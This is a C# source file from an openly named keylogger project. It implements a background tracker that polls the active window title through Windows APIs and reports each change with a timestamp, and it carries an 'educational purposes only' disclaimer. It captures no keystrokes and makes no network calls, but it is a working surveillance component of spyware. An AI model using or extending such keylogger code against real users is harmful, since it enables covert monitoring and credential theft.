using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Keylogger.Core.WindowTracking
{
    /// <summary>
    /// Tracks the currently active window for contextual information
    /// For educational and research purposes only
    /// </summary>
    public class ActiveWindowTracker
    {
        // Import required Windows API functions
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        // Event for window change detection
        public event EventHandler<WindowChangedEventArgs> WindowChanged;

        private volatile bool _isRunning;
        private Thread _monitorThread;
        private string _currentWindowTitle = string.Empty;
        private readonly int _checkIntervalMs;

        public ActiveWindowTracker(int checkIntervalMs = 100)
        {
            _checkIntervalMs = checkIntervalMs;
        }

        /// <summary>
        /// Starts the active window monitoring process
        /// </summary>
        public void Start()
        {
            if (_isRunning)
                return;

            _isRunning = true;
            _monitorThread = new Thread(MonitorActiveWindow) { IsBackground = true };
            _monitorThread.Start();
        }

        /// <summary>
        /// Stops the active window monitoring process
        /// </summary>
        public void Stop()
        {
            _isRunning = false;
            _monitorThread?.Join(1000);
        }

        /// <summary>
        /// The main monitoring loop that checks for window changes
        /// </summary>
        private void MonitorActiveWindow()
        {
            while (_isRunning)
            {
                CheckActiveWindowChange();
                Thread.Sleep(_checkIntervalMs);
            }
        }

        /// <summary>
        /// Checks if the active window has changed
        /// </summary>
        private void CheckActiveWindowChange()
        {
            IntPtr foregroundWindow = GetForegroundWindow();
            StringBuilder windowTitle = new StringBuilder(256);
            if (GetWindowText(foregroundWindow, windowTitle, 256) > 0)
            {
                string newWindow = windowTitle.ToString();
                if (newWindow != _currentWindowTitle)
                {
                    string oldWindow = _currentWindowTitle;
                    _currentWindowTitle = newWindow;

                    // Raise event with window change information
                    WindowChanged?.Invoke(this, new WindowChangedEventArgs(
                        oldWindow, 
                        _currentWindowTitle, 
                        foregroundWindow, 
                        DateTime.Now
                    ));
                }
            }
        }

        /// <summary>
        /// Gets the title of the currently active window
        /// </summary>
        /// <returns>The active window title</returns>
        public string GetCurrentWindowTitle()
        {
            return _currentWindowTitle;
        }
    }

    /// <summary>
    /// Event arguments for window change events
    /// </summary>
    public class WindowChangedEventArgs : EventArgs
    {
        public string OldWindowTitle { get; }
        public string NewWindowTitle { get; }
        public IntPtr WindowHandle { get; }
        public DateTime Timestamp { get; }

        public WindowChangedEventArgs(string oldWindowTitle, string newWindowTitle, IntPtr windowHandle, DateTime timestamp)
        {
            OldWindowTitle = oldWindowTitle;
            NewWindowTitle = newWindowTitle;
            WindowHandle = windowHandle;
            Timestamp = timestamp;
        }
    }
}